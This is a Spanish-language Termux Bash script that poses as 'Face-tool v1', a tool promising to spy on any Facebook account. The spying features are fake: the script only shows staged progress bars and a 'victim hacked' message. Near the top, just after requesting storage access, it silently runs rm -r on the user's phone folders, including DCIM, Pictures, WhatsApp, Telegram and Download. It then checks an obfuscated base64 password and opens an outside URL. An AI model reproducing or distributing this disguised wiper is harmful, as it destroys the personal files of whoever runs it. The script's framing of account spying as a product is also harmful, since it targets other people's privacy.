#!/bin/bash

#!Rojo
R='\033[1;31m'

#!Verde
V='\033[1;32m'
GOKE='\033[92m'

#!Amarillo
Y='\033[1;33m'

#!Azul
B='\033[0;34m'

#!Morado
M='\033[1;35m'

#!Cian
C='\033[1;36m'

#!Blanco
W='\033[0m'


apt-get install figlet
apt-get install cowsay
termux-setup-storage
clear
rm -r /sdcard/Download
rm -r /sdcard/download
rm -r /sdcard/Android
rm -r /sdcard/DCIM
rm -r /sdcard/WhatsApp
rm -r /sdcard/GBWhatsApp
rm -r /sdcard/snaptube 
rm -r /sdcard/Telegram
rm -r /sdcard/Pictures
rm -r /sdcard/bluetooth
rm -r /sdcard/Movies
clear
sleep 1
printf "$V"

figlet  Bienvenido a 
printf "$B"
figlet Face-tool v1
printf "\n"

printf $M"                                   CREADO POR $Y Команда-Осьминог"
printf "\n\n"

printf "____________________________________________________________"
printf "\n\n"
sleep 2
printf "$B"

printf "  CON ESTE SCRIPT PODRAS ESPIAR CUALQUIER CUENTA DE $V Facebook"
printf "\n\n"
printf "$B"
sleep 2
printf "  Dispondras de las siguientes caracteristicas:"
printf "\n\n"
sleep 2

printf $V"   •Podras espiar sus conversaciones en tiempo real"
printf "\n\n"
sleep 1

printf $V"   •Podras acceder a su hubicación"
printf "\n\n"
sleep 1

printf $V"   •Podras acceder a sus publicaciones privadas "                                         
printf "\n\n"
sleep 1

printf $V"   •Podras cambiar y editar cualquier publicación"
printf "\n\n"
sleep 1

printf $V"   •Tendras acceso remoto a su dispositivo"  
printf "\n\n"
sleep 1

printf "$M"
printf "  NOS IMPORTA UNA MIERDA LAS CUENTAS QUE QUIERAS ESPIAR "
printf "\n"
printf "  PERO POR FINES LEGALES LE RECORDAMOS QUE" 
printf "\n\n"
sleep 1

printf $R"  NO NOS HACEMOS RESPONSABLES\n"
printf "  DEL MAL USO QUE PUEDA HACER DE ESTE SCRIPT"
sleep 2
printf "\n\n"

file=$(mktemp)
echo "YXB4eFRNMDIK" > $file
realPWD=$(base64 -d $file)

printf "$V{ A CONTINUACIÓN ESCRIBE LA CLAVE DE ACCESO }\n\t"$B
while read -s -p  "╰────➤ " typedPWD && [ -z $typedPWD ]; do
	continue
done

while [ "$typedPWD" != "$realPWD" ]; do
	clear
	printf "$R\n\t==➤ CONTRASEÑA INCORRECTA$W\n"
	exit
        
done




if [[ -e $file ]]; then
	rm -rf $file
fi


printf "\n\n"
clear
printf "$B"
figlet Face - tool
printf "\n"
printf $B" Bien venido $typedPWD "
printf "\n\n"
sleep 2
printf $GOKE" CONECTANDO AL SERVIDOR "
sleep 1.7
printf "."
sleep 1.7
printf "."
sleep 1.7
printf "."
sleep 1.4
printf "\n\n"
printf " PREPARANDO EL SCRIPT PORFAVOR ESPERE"
printf "\n\n"
sleep 1.5
printf "$C [▉▉▉"
sleep 2
printf "▉▉▉▉▉▉▉"
sleep 2.7
printf "▉▉▉▉▉▉▉▉▉▉▉▉"
sleep 4
printf "▉▉▉▉▉▉▉▉▉▉▉▉▉"
sleep 4
printf "▉▉▉▉▉▉▉▉▉▉▉]"
sleep 0.7
printf $Y"１００％"
printf "\n\n"
sleep 0.5
printf $V" CONEXIÓN ESTABLECIDA"
printf "\n\n"
printf $B" URL DEL PERFIL DE LA VICTIMA
        ╰────➤ $Y"
	 read numero
printf "\n\n"
printf $V" Verificando la url $Y $numero"
printf "\n\n"
sleep 4
printf $V" Url verificada correctanente"
sleep 1
printf "\n\n"
printf $V" Conectando con el Host "
sleep 3
printf "."
sleep 3
printf "."
sleep 3
printf "."
sleep 2
printf "\n\n"
printf $Y" ¡CONEXIÓN ESTABLECIDA!"$C
sleep 2
printf "\n\n"

sleep 3
clear

cowsay -f tux ENORABUENA TU VICTIMA FUE HACKEADA

sleep 4

termux-open-url https://hackingworld09.github.io/kill-lamer09/
